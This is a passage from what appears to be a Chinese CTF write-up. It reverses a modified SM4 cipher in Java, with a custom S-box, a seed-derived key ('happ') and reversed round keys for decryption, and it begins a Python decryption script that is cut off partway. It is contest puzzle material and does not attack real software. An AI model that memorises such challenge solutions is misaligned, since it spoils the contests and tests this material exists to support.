class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Sm4</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] SBOX = <span class="keyword">new</span> <span class="title class_">byte</span>[] &#123; </span><br><span class="line">      -<span class="number">42</span>, -<span class="number">112</span>, -<span class="number">23</span>, -<span class="number">2</span>, -<span class="number">52</span>, -<span class="number">31</span>, <span class="number">61</span>, -<span class="number">73</span>, <span class="number">22</span>, -<span class="number">74</span>, </span><br><span class="line">      <span class="number">20</span>, -<span class="number">62</span>, <span class="number">40</span>, -<span class="number">5</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">103</span>, -<span class="number">102</span>, <span class="number">118</span>, </span><br><span class="line">      <span class="number">42</span>, -<span class="number">66</span>, <span class="number">4</span>, -<span class="number">61</span>, -<span class="number">86</span>, <span class="number">68</span>, <span class="number">19</span>, <span class="number">38</span>, <span class="number">73</span>, -<span class="number">122</span>, </span><br><span class="line">      <span class="number">6</span>, -<span class="number">103</span>, -<span class="number">100</span>, <span class="number">66</span>, <span class="number">80</span>, -<span class="number">12</span>, -<span class="number">111</span>, -<span class="number">17</span>, -<span class="number">104</span>, <span class="number">122</span>, </span><br><span class="line">      <span class="number">51</span>, <span class="number">84</span>, <span class="number">11</span>, <span class="number">67</span>, -<span class="number">19</span>, -<span class="number">49</span>, -<span class="number">84</span>, <span class="number">98</span>, -<span class="number">28</span>, -<span class="number">77</span>, </span><br><span class="line">      <span class="number">28</span>, -<span class="number">87</span>, -<span class="number">55</span>, <span class="number">8</span>, -<span class="number">24</span>, -<span class="number">107</span>, Byte.MIN_VALUE, -<span class="number">33</span>, -<span class="number">108</span>, -<span class="number">6</span>, </span><br><span class="line">      <span class="number">117</span>, -<span class="number">113</span>, <span class="number">63</span>, -<span class="number">90</span>, <span class="number">71</span>, <span class="number">7</span>, -<span class="number">89</span>, -<span class="number">4</span>, -<span class="number">13</span>, <span class="number">115</span>, </span><br><span class="line">      <span class="number">23</span>, -<span class="number">70</span>, -<span class="number">125</span>, <span class="number">89</span>, <span class="number">60</span>, <span class="number">25</span>, -<span class="number">26</span>, -<span class="number">123</span>, <span class="number">79</span>, -<span class="number">88</span>, </span><br><span class="line">      <span class="number">104</span>, <span class="number">107</span>, -<span class="number">127</span>, -<span class="number">78</span>, <span class="number">113</span>, <span class="number">100</span>, -<span class="number">38</span>, -<span class="number">117</span>, -<span class="number">8</span>, -<span class="number">21</span>, </span><br><span class="line">      <span class="number">15</span>, <span class="number">75</span>, <span class="number">112</span>, <span class="number">86</span>, -<span class="number">99</span>, <span class="number">53</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">94</span>, </span><br><span class="line">      <span class="number">99</span>, <span class="number">88</span>, -<span class="number">47</span>, -<span class="number">94</span>, <span class="number">37</span>, <span class="number">34</span>, <span class="number">124</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">33</span>, </span><br><span class="line">      <span class="number">120</span>, -<span class="number">121</span>, -<span class="number">44</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">87</span>, -<span class="number">97</span>, -<span class="number">45</span>, <span class="number">39</span>, <span class="number">82</span>, </span><br><span class="line">      <span class="number">76</span>, <span class="number">54</span>, <span class="number">2</span>, -<span class="number">25</span>, -<span class="number">96</span>, -<span class="number">60</span>, -<span class="number">56</span>, -<span class="number">98</span>, -<span class="number">22</span>, -<span class="number">65</span>, </span><br><span class="line">      -<span class="number">118</span>, -<span class="number">46</span>, <span class="number">64</span>, -<span class="number">57</span>, <span class="number">56</span>, -<span class="number">75</span>, -<span class="number">93</span>, -<span class="number">9</span>, -<span class="number">14</span>, -<span class="number">50</span>, </span><br><span class="line">      -<span class="number">7</span>, <span class="number">97</span>, <span class="number">21</span>, -<span class="number">95</span>, -<span class="number">32</span>, -<span class="number">82</span>, <span class="number">93</span>, -<span class="number">92</span>, -<span class="number">101</span>, <span class="number">52</span>, </span><br><span class="line">      <span class="number">26</span>, <span class="number">85</span>, -<span class="number">83</span>, -<span class="number">109</span>, <span class="number">50</span>, <span class="number">48</span>, -<span class="number">11</span>, -<span class="number">116</span>, -<span class="number">79</span>, -<span class="number">29</span>, </span><br><span class="line">      <span class="number">29</span>, -<span class="number">10</span>, -<span class="number">30</span>, <span class="number">46</span>, -<span class="number">126</span>, <span class="number">102</span>, -<span class="number">54</span>, <span class="number">96</span>, -<span class="number">64</span>, <span class="number">41</span>, </span><br><span class="line">      <span class="number">35</span>, -<span class="number">85</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">78</span>, <span class="number">111</span>, -<span class="number">43</span>, -<span class="number">37</span>, <span class="number">55</span>, <span class="number">69</span>, </span><br><span class="line">      -<span class="number">34</span>, -<span class="number">3</span>, -<span class="number">114</span>, <span class="number">47</span>, <span class="number">3</span>, -<span class="number">1</span>, <span class="number">106</span>, <span class="number">114</span>, <span class="number">109</span>, <span class="number">108</span>, </span><br><span class="line">      <span class="number">91</span>, <span class="number">81</span>, -<span class="number">115</span>, <span class="number">27</span>, -<span class="number">81</span>, -<span class="number">110</span>, -<span class="number">69</span>, -<span class="number">35</span>, -<span class="number">68</span>, Byte.MAX_VALUE, </span><br><span class="line">      <span class="number">17</span>, -<span class="number">39</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">31</span>, <span class="number">16</span>, <span class="number">90</span>, -<span class="number">40</span>, <span class="number">10</span>, -<span class="number">63</span>, </span><br><span class="line">      <span class="number">49</span>, -<span class="number">120</span>, -<span class="number">91</span>, -<span class="number">51</span>, <span class="number">123</span>, -<span class="number">67</span>, <span class="number">45</span>, <span class="number">116</span>, -<span class="number">48</span>, <span class="number">18</span>, </span><br><span class="line">      -<span class="number">72</span>, -<span class="number">27</span>, -<span class="number">76</span>, -<span class="number">80</span>, -<span class="number">119</span>, <span class="number">105</span>, -<span class="number">105</span>, <span class="number">74</span>, <span class="number">12</span>, -<span class="number">106</span>, </span><br><span class="line">      <span class="number">119</span>, <span class="number">126</span>, <span class="number">101</span>, -<span class="number">71</span>, -<span class="number">15</span>, <span class="number">9</span>, -<span class="number">59</span>, <span class="number">110</span>, -<span class="number">58</span>, -<span class="number">124</span>, </span><br><span class="line">      <span class="number">24</span>, -<span class="number">16</span>, <span class="number">125</span>, -<span class="number">20</span>, <span class="number">58</span>, -<span class="number">36</span>, <span class="number">77</span>, <span class="number">32</span>, <span class="number">121</span>, -<span class="number">18</span>, </span><br><span class="line">      <span class="number">95</span>, <span class="number">62</span>, -<span class="number">41</span>, -<span class="number">53</span>, <span class="number">57</span>, <span class="number">72</span> &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span>[] FK = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; -<span class="number">1548633402</span>, <span class="number">1453994832</span>, <span class="number">1736282519</span>, -<span class="number">1301273892</span> &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span>[] CK = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123; </span><br><span class="line">      <span class="number">462357</span>, <span class="number">472066609</span>, <span class="number">943670861</span>, <span class="number">1415275113</span>, <span class="number">1886879365</span>, -<span class="number">1936483679</span>, -<span class="number">1464879427</span>, -<span class="number">993275175</span>, -<span class="number">521670923</span>, -<span class="number">66909679</span>, </span><br><span class="line">      <span class="number">404694573</span>, <span class="number">876298825</span>, <span class="number">1347903077</span>, <span class="number">1819507329</span>, -<span class="number">2003855715</span>, -<span class="number">1532251463</span>, -<span class="number">1060647211</span>, -<span class="number">589042959</span>, -<span class="number">117504499</span>, <span class="number">337322537</span>, </span><br><span class="line">      <span class="number">808926789</span>, <span class="number">1280531041</span>, <span class="number">1752135293</span>, -<span class="number">2071227751</span>, -<span class="number">1599623499</span>, -<span class="number">1128019247</span>, -<span class="number">656414995</span>, -<span class="number">184876535</span>, <span class="number">269950501</span>, <span class="number">741554753</span>, </span><br><span class="line">      <span class="number">1213159005</span>, <span class="number">1684763257</span> &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] SBOX_P = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">256</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>; b &lt; <span class="string">&#x27;; b++) &#123;</span></span><br><span class="line"><span class="string">      int i = (b ^ 0xA7) &amp; 0xFF;</span></span><br><span class="line"><span class="string">      int j = SBOX[i] &amp; 0xFF;</span></span><br><span class="line"><span class="string">      int k = b &amp; 0x3;</span></span><br><span class="line"><span class="string">      int m = rotl8(j, k);</span></span><br><span class="line"><span class="string">      SBOX_P[b] = (byte)m;</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static byte[] deriveKeyFromSeed(String paramString) &#123;</span></span><br><span class="line"><span class="string">    byte[] arrayOfByte1 = paramString.getBytes(StandardCharsets.UTF_8);</span></span><br><span class="line"><span class="string">    byte[] arrayOfByte2 = new byte[16];</span></span><br><span class="line"><span class="string">    for (byte b = 0; b &lt; 16; b++) &#123;</span></span><br><span class="line"><span class="string">      int i = arrayOfByte1[b % arrayOfByte1.length] &amp; 0xFF;</span></span><br><span class="line"><span class="string">      int j = i + b * 17 + 35 &amp; 0xFF;</span></span><br><span class="line"><span class="string">      arrayOfByte2[b] = (byte)j;</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    return arrayOfByte2;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static byte[] encrypt(byte[] paramArrayOfbyte1, byte[] paramArrayOfbyte2) &#123;</span></span><br><span class="line"><span class="string">    int[] arrayOfInt = expandKey(paramArrayOfbyte1);</span></span><br><span class="line"><span class="string">    byte[] arrayOfByte1 = pkcs7Pad(paramArrayOfbyte2);</span></span><br><span class="line"><span class="string">    byte[] arrayOfByte2 = new byte[arrayOfByte1.length];</span></span><br><span class="line"><span class="string">    for (byte b = 0; b &lt; arrayOfByte1.length; b += 16)</span></span><br><span class="line"><span class="string">      encryptBlock(arrayOfByte1, b, arrayOfByte2, b, arrayOfInt); </span></span><br><span class="line"><span class="string">    return arrayOfByte2;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static String toHex(byte[] paramArrayOfbyte) &#123;</span></span><br><span class="line"><span class="string">    StringBuilder stringBuilder = new StringBuilder(paramArrayOfbyte.length * 2);</span></span><br><span class="line"><span class="string">    for (byte b : paramArrayOfbyte) &#123;</span></span><br><span class="line"><span class="string">      String str = Integer.toHexString(b &amp; 0xFF);</span></span><br><span class="line"><span class="string">      if (str.length() == 1)</span></span><br><span class="line"><span class="string">        stringBuilder.append(&#x27;</span><span class="number">0</span><span class="string">&#x27;); </span></span><br><span class="line"><span class="string">      stringBuilder.append(str);</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    return stringBuilder.toString();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static byte[] pkcs7Pad(byte[] paramArrayOfbyte) &#123;</span></span><br><span class="line"><span class="string">    int i = 16 - paramArrayOfbyte.length % 16;</span></span><br><span class="line"><span class="string">    if (i == 0)</span></span><br><span class="line"><span class="string">      i = 16; </span></span><br><span class="line"><span class="string">    byte[] arrayOfByte = Arrays.copyOf(paramArrayOfbyte, paramArrayOfbyte.length + i);</span></span><br><span class="line"><span class="string">    Arrays.fill(arrayOfByte, paramArrayOfbyte.length, arrayOfByte.length, (byte)i);</span></span><br><span class="line"><span class="string">    return arrayOfByte;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static int[] expandKey(byte[] paramArrayOfbyte) &#123;</span></span><br><span class="line"><span class="string">    int[] arrayOfInt1 = new int[4];</span></span><br><span class="line"><span class="string">    arrayOfInt1[0] = bytesToInt(paramArrayOfbyte, 0);</span></span><br><span class="line"><span class="string">    arrayOfInt1[1] = bytesToInt(paramArrayOfbyte, 4);</span></span><br><span class="line"><span class="string">    arrayOfInt1[2] = bytesToInt(paramArrayOfbyte, 8);</span></span><br><span class="line"><span class="string">    arrayOfInt1[3] = bytesToInt(paramArrayOfbyte, 12);</span></span><br><span class="line"><span class="string">    int[] arrayOfInt2 = new int[36];</span></span><br><span class="line"><span class="string">    for (byte b1 = 0; b1 &lt; 4; b1++)</span></span><br><span class="line"><span class="string">      arrayOfInt2[b1] = arrayOfInt1[b1] ^ FK[b1]; </span></span><br><span class="line"><span class="string">    int[] arrayOfInt3 = new int[32];</span></span><br><span class="line"><span class="string">    for (byte b2 = 0; b2 &lt; 32; b2++) &#123;</span></span><br><span class="line"><span class="string">      int i = arrayOfInt2[b2 + 1] ^ arrayOfInt2[b2 + 2] ^ arrayOfInt2[b2 + 3] ^ CK[b2];</span></span><br><span class="line"><span class="string">      i = TPrime(i);</span></span><br><span class="line"><span class="string">      arrayOfInt2[b2 + 4] = arrayOfInt2[b2] ^ i;</span></span><br><span class="line"><span class="string">      arrayOfInt3[b2] = arrayOfInt2[b2 + 4];</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    return arrayOfInt3;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static void encryptBlock(byte[] paramArrayOfbyte1, int paramInt1, byte[] paramArrayOfbyte2, int paramInt2, int[] paramArrayOfint) &#123;</span></span><br><span class="line"><span class="string">    int[] arrayOfInt = new int[36];</span></span><br><span class="line"><span class="string">    arrayOfInt[0] = bytesToInt(paramArrayOfbyte1, paramInt1);</span></span><br><span class="line"><span class="string">    arrayOfInt[1] = bytesToInt(paramArrayOfbyte1, paramInt1 + 4);</span></span><br><span class="line"><span class="string">    arrayOfInt[2] = bytesToInt(paramArrayOfbyte1, paramInt1 + 8);</span></span><br><span class="line"><span class="string">    arrayOfInt[3] = bytesToInt(paramArrayOfbyte1, paramInt1 + 12);</span></span><br><span class="line"><span class="string">    int i;</span></span><br><span class="line"><span class="string">    for (i = 0; i &lt; 32; i++) &#123;</span></span><br><span class="line"><span class="string">      int n = arrayOfInt[i + 1] ^ arrayOfInt[i + 2] ^ arrayOfInt[i + 3] ^ paramArrayOfint[i];</span></span><br><span class="line"><span class="string">      n = T(n);</span></span><br><span class="line"><span class="string">      arrayOfInt[i + 4] = arrayOfInt[i] ^ n;</span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    i = arrayOfInt[35];</span></span><br><span class="line"><span class="string">    int j = arrayOfInt[34];</span></span><br><span class="line"><span class="string">    int k = arrayOfInt[33];</span></span><br><span class="line"><span class="string">    int m = arrayOfInt[32];</span></span><br><span class="line"><span class="string">    intToBytes(i, paramArrayOfbyte2, paramInt2);</span></span><br><span class="line"><span class="string">    intToBytes(j, paramArrayOfbyte2, paramInt2 + 4);</span></span><br><span class="line"><span class="string">    intToBytes(k, paramArrayOfbyte2, paramInt2 + 8);</span></span><br><span class="line"><span class="string">    intToBytes(m, paramArrayOfbyte2, paramInt2 + 12);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static int T(int paramInt) &#123;</span></span><br><span class="line"><span class="string">    int i = tau(paramInt);</span></span><br><span class="line"><span class="string">    return i ^ rotl(i, 2) ^ rotl(i, 10) ^ rotl(i, 18) ^ rotl(i, 24);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static int TPrime(int paramInt) &#123;</span></span><br><span class="line"><span class="string">    int i = tau(paramInt);</span></span><br><span class="line"><span class="string">    return i ^ rotl(i, 13) ^ rotl(i, 23);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static int tau(int paramInt) &#123;</span></span><br><span class="line"><span class="string">    int i = paramInt &gt;&gt;&gt; 24 &amp; 0xFF;</span></span><br><span class="line"><span class="string">    int j = paramInt &gt;&gt;&gt; 16 &amp; 0xFF;</span></span><br><span class="line"><span class="string">    int k = paramInt &gt;&gt;&gt; 8 &amp; 0xFF;</span></span><br><span class="line"><span class="string">    int m = paramInt &amp; 0xFF;</span></span><br><span class="line"><span class="string">    i = sboxTransform(i);</span></span><br><span class="line"><span class="string">    j = sboxTransform(j);</span></span><br><span class="line"><span class="string">    k = sboxTransform(k);</span></span><br><span class="line"><span class="string">    m = sboxTransform(m);</span></span><br><span class="line"><span class="string">    return i &lt;&lt; 24 | j &lt;&lt; 16 | k &lt;&lt; 8 | m;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static int sboxTransform(int paramInt) &#123;</span></span><br><span class="line"><span class="string">    int i = (paramInt ^ 0x3C) &amp; 0xFF;</span></span><br><span class="line"><span class="string">    return SBOX_P[i] &amp; 0xFF;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static int rotl(int paramInt1, int paramInt2) &#123;</span></span><br><span class="line"><span class="string">    return paramInt1 &lt;&lt; paramInt2 | paramInt1 &gt;&gt;&gt; 32 - paramInt2;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static int rotl8(int paramInt1, int paramInt2) &#123;</span></span><br><span class="line"><span class="string">    paramInt2 &amp;= 0x7;</span></span><br><span class="line"><span class="string">    return (paramInt1 &lt;&lt; paramInt2 | paramInt1 &gt;&gt;&gt; 8 - paramInt2) &amp; 0xFF;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static int bytesToInt(byte[] paramArrayOfbyte, int paramInt) &#123;</span></span><br><span class="line"><span class="string">    return (paramArrayOfbyte[paramInt] &amp; 0xFF) &lt;&lt; 24 | (paramArrayOfbyte[paramInt + 1] &amp; 0xFF) &lt;&lt; 16 | (paramArrayOfbyte[paramInt + 2] &amp; 0xFF) &lt;&lt; 8 | paramArrayOfbyte[paramInt + 3] &amp; 0xFF;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  private static void intToBytes(int paramInt1, byte[] paramArrayOfbyte, int paramInt2) &#123;</span></span><br><span class="line"><span class="string">    paramArrayOfbyte[paramInt2] = (byte)(paramInt1 &gt;&gt;&gt; 24);</span></span><br><span class="line"><span class="string">    paramArrayOfbyte[paramInt2 + 1] = (byte)(paramInt1 &gt;&gt;&gt; 16);</span></span><br><span class="line"><span class="string">    paramArrayOfbyte[paramInt2 + 2] = (byte)(paramInt1 &gt;&gt;&gt; 8);</span></span><br><span class="line"><span class="string">    paramArrayOfbyte[paramInt2 + 3] = (byte)paramInt1;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>故名思义是<strong>SM4</strong>算法，ai一把梭了，赛后再看看</p>
<p>基本信息，SM4也是一种对称加密算法，俗称国密算法</p>
<p>题目对SM4略微改动了，</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Key 派生逻辑 (deriveKeyFromSeed):</span><br><span class="line">使用 &quot;happ&quot; 作为种子，通过公式 (seed[i % len] + i * 17 + 35) &amp; 0xFF 生成 16 字节密钥。</span><br><span class="line">自定义 S 盒:</span><br><span class="line">代码在 static 块中通过 SBOX 生成了 SBOX_P，并且在 sboxTransform 中又做了一次异或 0x3C 的变换。</span><br><span class="line">解密方法:</span><br><span class="line">SM4 是对称算法，解密过程与加密完全相同，只需要将 32 个轮密钥（Round Keys）逆序使用 即可。</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">SBOX_RAW = [</span><br><span class="line">    -<span class="number">42</span>, -<span class="number">112</span>, -<span class="number">23</span>, -<span class="number">2</span>, -<span class="number">52</span>, -<span class="number">31</span>, <span class="number">61</span>, -<span class="number">73</span>, <span class="number">22</span>, -<span class="number">74</span>, <span class="number">20</span>, -<span class="number">62</span>, <span class="number">40</span>, -<span class="number">5</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">103</span>, -<span class="number">102</span>, <span class="number">118</span>, </span><br><span class="line">    <span class="number">42</span>, -<span class="number">66</span>, <span class="number">4</span>, -<span class="number">61</span>, -<span class="number">86</span>, <span class="number">68</span>, <span class="number">19</span>, <span class="number">38</span>, <span class="number">73</span>, -<span class="number">122</span>, <span class="number">6</span>, -<span class="number">103</span>, -<span class="number">100</span>, <span class="number">66</span>, <span class="number">80</span>, -<span class="number">12</span>, -<span class="number">111</span>, -<span class="number">17</span>, -<span class="number">104</span>, <span class="number">122</span>, </span><br><span class="line">    <span class="number">51</span>, <span class="number">84</span>, <span class="number">11</span>, <span class="number">67</span>, -<span class="number">19</span>, -<span class="number">49</span>, -<span class="number">84</span>, <span class="number">98</span>, -<span class="number">28</span>, -<span class="number">77</span>, <span class="number">28</span>, -<span class="number">87</span>, -<span class="number">55</span>, <span class="number">8</span>, -<span class="number">24</span>, -<span class="number">107</span>, -<span class="number">128</span>, -<span class="number">33</span>, -<span class="number">108</span>, -<span class="number">6</span>, </span><br><span class="line">    <span class="number">117</span>, -<span class="number">113</span>, <span class="number">63</span>, -<span class="number">90</span>, <span class="number">71</span>, <span class="number">7</span>, -<span class="number">89</span>, -<span class="number">4</span>, -<span class="number">13</span>, <span class="number">115</span>, <span class="number">23</span>, -<span class="number">70</span>, -<span class="number">125</span>, <span class="number">89</span>, <span class="number">60</span>, <span class="number">25</span>, -<span class="number">26</span>, -<span class="number">123</span>, <span class="number">79</span>, -<span class="number">88</span>, </span><br><span class="line">    <span class="number">104</span>, <span class="number">107</span>, -<span class="number">127</span>, -<span class="number">78</span>, <span class="number">113</span>, <span class="number">100</span>, -<span class="number">38</span>, -<span class="number">117</span>, -<span class="number">8</span>, -<span class="number">21</span>, <span class="number">15</span>, <span class="number">75</span>, <span class="number">112</span>, <span class="number">86</span>, -<span class="number">99</span>, <span class="number">53</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">14</span>, <span class="number">94</span>, </span><br><span class="line">    <span class="number">99</span>, <span class="number">88</span>, -<span class="number">47</span>, -<span class="number">94</span>, <span class="number">37</span>, <span class="number">34</span>, <span class="number">124</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">33</span>, <span class="number">120</span>, -<span class="number">121</span>, -<span class="number">44</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">87</span>, -<span class="number">97</span>, -<span class="number">45</span>, <span class="number">39</span>, <span class="number">82</span>, </span><br><span class="line">    <span class="number">76</span>, <span class="number">54</span>, <span class="number">2</span>, -<span class="number">25</span>, -<span class="number">96</span>, -<span class="number">60</span>, -<span class="number">56</span>, -<span class="number">98</span>, -<span class="number">22</span>, -<span class="number">65</span>, -<span class="number">118</span>, -<span class="number">46</span>, <span class="number">64</span>, -<span class="number">57</span>, <span class="number">56</span>, -<span class="number">75</span>, -<span class="number">93</span>, -<span class="number">9</span>, -<span class="number">14</span>, -<span class="number">50</span>, </span><br><span class="line">    -<span class="number">7</span>, <span class="number">97</span>, <span class="number">21</span>, -<span class="number">95</span>, -<span class="number">32</span>, -<span class="number">82</span>, <span class="number">93</span>, -<span class="number">92</span>, -<span class="number">101</span>, <span class="number">52</span>, <span class="number">26</span>, <span class="number">85</span>, -<span class="number">83</span>, -<span class="number">109</span>, <span class="number">50</span>, <span class="number">48</span>, -<span class="number">11</span>, -<span class="number">116</span>, -<span class="number">79</span>, -<span class="number">29</span>, </span><br><span class="line">    <span class="number">29</span>, -<span class="number">10</span>, -<span class="number">30</span>, <span class="number">46</span>, -<span class="number">126</span>, <span class="number">102</span>, -<span class="number">54</span>, <span class="number">96</span>, -<span class="number">64</span>, <span class="number">41</span>, <span class="number">35</span>, -<span class="number">85</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">78</span>, <span class="number">111</span>, -<span class="number">43</span>, -<span class="number">37</span>, <span class="number">55</span>, <span class="number">69</span>, </span><br><span class="line">    -<span class="number">34</span>, -<span class="number">3</span>, -<span class="number">114</span>, <span class="number">47</span>, <span class="number">3</span>, -<span class="number">1</span>, <span class="number">106</span>, <span class="number">114</span>, <span class="number">109</span>, <span class="number">108</span>, <span class="number">91</span>, <span class="number">81</span>, -<span class="number">115</span>, <span class="number">27</span>, -<span class="number">81</span>, -<span class="number">110</span>, -<span class="number">69</span>, -<span class="number">35</span>, -<span class="number">68</span>, <span class="number">127</span>, </span><br><span class="line">    <span class="number">17</span>, -<span class="number">39</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">31</span>, <span class="number">16</span>, <span class="number">90</span>, -<span class="number">40</span>, <span class="number">10</span>, -<span class="number">63</span>, <span class="number">49</span>, -<span class="number">120</span>, -<span class="number">91</span>, -<span class="number">51</span>, <span class="number">123</span>, -<span class="number">67</span>, <span class="number">45</span>, <span class="number">116</span>, -<span class="number">48</span>, <span class="number">18</span>, </span><br><span class="line">    -<span class="number">72</span>, -<span class="number">27</span>, -<span class="number">76</span>, -<span class="number">80</span>, -<span class="number">119</span>, <span class="number">105</span>, -<span class="number">105</span>, <span class="number">74</span>, <span class="number">12</span>, -<span class="number">106</span>, <span class="number">119</span>, <span class="number">126</span>, <span class="number">101</span>, -<span class="number">71</span>, -<span class="number">15</span>, <span class="number">9</span>, -<span class="number">59</span>, <span class="number">110</span>, -<span class="number">58</span>, -<span class="number">124</span>, </span><br><span class="line">    <span class="number">24</span>, -<span class="number">16</span>, <span class="number">125</span>, -<span class="number">20</span>, <span class="number">58</span>, -<span class="number">36</span>, <span class="number">77</span>, <span class="number">32</span>, <span 